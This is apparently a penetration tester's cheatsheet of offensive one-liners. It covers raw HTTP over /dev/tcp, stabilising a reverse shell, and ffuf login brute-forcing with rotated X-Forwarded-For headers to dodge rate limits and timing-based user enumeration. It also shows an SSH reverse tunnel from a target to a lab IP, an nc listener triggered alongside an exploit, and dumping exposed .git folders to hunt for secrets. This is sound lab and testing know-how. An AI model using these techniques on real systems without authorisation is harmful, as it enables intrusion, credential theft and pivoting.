---
layout: cheatsheet
title: Cheatsheet
date: 2025-11-04
categories: []
tags: []
---

<article class="cheat-item" data-keywords="linux http lotl docker-escape" markdown="1">

### LOTL - HTTP via /dev/tcp

Craft an HTTP request with `/dev/tcp` when `curl` and `wget` are missing. Very useful when stuck in a minimal Docker container.

```sh
HOST=127.0.0.1; PORT=5000; WPATH=/index.html; exec 3<>/dev/tcp/$HOST/$PORT; printf "GET $WPATH HTTP/1.0\r\nHost: $HOST:$PORT\r\n\r\n" >&3; cat <&3
```

</article>


<article class="cheat-item" data-keywords="linux reverse-shell" markdown="1">

### Reverse Shell - stabilize

My favourite method - very minimal, no Python needed. Upgrades a simple shell to a fully interactive TTY.

```sh
SHELL=/bin/bash script -q /dev/null
# press CTRL+Z to put the current process in background and run stty on your host
stty raw -echo; fg
reset
xterm
```

</article>


<article class="cheat-item" data-keywords="ffuf http bruteforce" markdown="1">

### FFUF - Clusterbomb & Pitchfork modes

Use FFUF in clusterbomb mode to brute-force a login form. Faster than Burp Intruder in the community version.

```sh
ffuf -request req.txt -request-proto https -mode clusterbomb -w users.txt:FUZZUSER -w passwords.txt:FUZZPWD -fr "Invalid username or password."
```

Use FFUF in pitchfork mode to brute-force a login form for user enumeration, rotating the X-Forwarded-For header so each request appears to come from a different IP to bypass rate limits. In the same attack, FFUF supplies a long password and filters out responses that take less than 1200 milliseconds to complete to exploit a response timing-based vulnerability (the webapp calculates the hash for the provided password only if the supplied user exists in the DB).

```sh
ffuf -request req_userenum.txt -mode pitchfork -request-proto https -w usr.txt:FUZZUSR -w ips.txt:FUZZIP -t 2 -ft "<1200"
```

</article>


<article class="cheat-item" data-keywords="ffuf http recon proxy" markdown="1">

### FFUF - Proxy

Route FFUF requests through Burp Suite (or other proxies) - useful for debugging them or manipulating them with a Burp extension.

```sh
ffuf -request req.txt -request-proto https -replay-proxy http://127.0.0.1:8080 -t 2
```

</article>


<article class="cheat-item" data-keywords="ssh tunnel" markdown="1">

### Tunneling - Zombie Relay

Clone the project and start the container. Then drop the container’s private key on the target and adjust its permissions.

```sh
git clone https://github.com/byt3loss/ZombieRelay.git
cd ZombieRelay
docker compose up -d
docker cp $(docker ps -l -q):/root/.ssh/id_ed25519 .
```

Run the following command on the target machine to start tunneling the remote service to the container. The remote service will be available on your host on port 9090.

```sh
ssh -i ssh_key -p 2224 -R 9090:127.0.0.1:19999 root@10.10.14.59 -N -f
```

</article>


<article class="cheat-item" data-keywords="bash scripting" markdown="1">

### Bash Scripting - useful tricks

Set of useful tricks or oneliners when scripting (exploits) in bash.

```sh
# Kill a process
KILLTHIS=$(ps -aux | grep '[h]ttp.server' | awk '{print $2}') && kill -9 $KILLTHIS

# Start server if not already started (or target port is not already in use)
netstat -tulpn 2>/dev/null | grep -q $PORT || python3 -m http.server $PORT -d srv/ &

# "Schedule" a background job that sends the exploit to the target after starting a foreground listener 
(sleep 5; curl -s -o /dev/null $EXPLOIT_REQUEST) &
nc -lnvp 4444
```

</article>


<article class="cheat-item" data-keywords="python scripting" markdown="1">

### Python - useful snippets

Set of useful snippets or oneliners in Python ready to use.

```sh
# generate a wordlist of printable characters for fuzzing
python3 -c "import string; [print(x) for x in string.printable.strip()]" > chars.txt

# generate a list of printable characters to be used in other scripts
python3 -c "import string; print(', '.join([f\"'{x}'\" for x in string.printable.strip()]))"
```

</article>


<article class="cheat-item" data-keywords="git dump git-dumper trufflehog" markdown="1">

### Dump exposed git directory and scan it

Use [git-dumper](https://github.com/arthaud/git-dumper) to dump exposed git folders on the web.

Scan the .git dir with [trufflehog](https://github.com/trufflesecurity/trufflehog) to find commited secrets.

```sh
# install
virtualenv .venv
pip install git-dumper

# dump
git-dumper https://vulnapp.com/.git /tmp/dump-output

# scan
./trufflehog git file:///tmp/dump-output
```

</article>


<article class="cheat-item" data-keywords="virtualbox vm docker" markdown="1">

### Random utils

```sh
# Sometimes Vbox Guest additions fail to resize the VM resolution. You can force it.
VBoxManage setextradata "<VM Name>" VBoxInternal2/EfiGraphicsResolution 1920x1080
# check graphic resolution info
VBoxManage getextradata "<VM Name>" enumerate

# Cleanup Docker containers, volumes, networks, images.
#!/bin/bash
sudo docker stop $(sudo docker ps -aq)
sudo docker rm $(sudo docker ps -aq)
sudo docker rmi $(sudo docker images -q)
sudo docker volume rm $(sudo docker volume ls -q)
sudo docker network rm $(sudo docker network ls -q)
```

</article>

